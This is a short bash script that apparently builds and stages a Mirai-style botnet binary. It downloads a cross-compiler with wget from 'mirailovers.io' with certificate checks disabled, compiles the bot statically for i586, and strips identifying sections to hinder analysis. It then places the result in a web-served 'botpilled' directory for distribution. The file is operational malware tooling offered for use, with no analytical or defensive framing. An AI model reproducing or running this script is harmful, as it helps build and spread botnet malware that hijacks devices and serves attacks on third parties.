#!/bin/bash

mkdir /etc/xcompile
cd /etc/xcompile 
wget https://mirailovers.io/HELL-ARCHIVE/COMPILERS/cross-compiler-i586.tar.bz2 --no-check-certificate

tar -jxf cross-compiler-i586.tar.bz2
rm -rf cross-compiler-i586.tar.bz2
mv cross-compiler-i586 i586
cd ~/

export PATH=$PATH:/etc/xcompile/i586/bin

function compile_bot {
    "$1-gcc" $3 main/*.c -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o release/"$2" -DDREAD_BOT_ARCH=\""$1"\"
    "$1-strip" release/"$2" -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr
}

mkdir release
compile_bot i586 rbot "-static"

mkdir /var/www/html/botpilled
mv ~/release/* /var/www/html/botpilled

rm -rf release
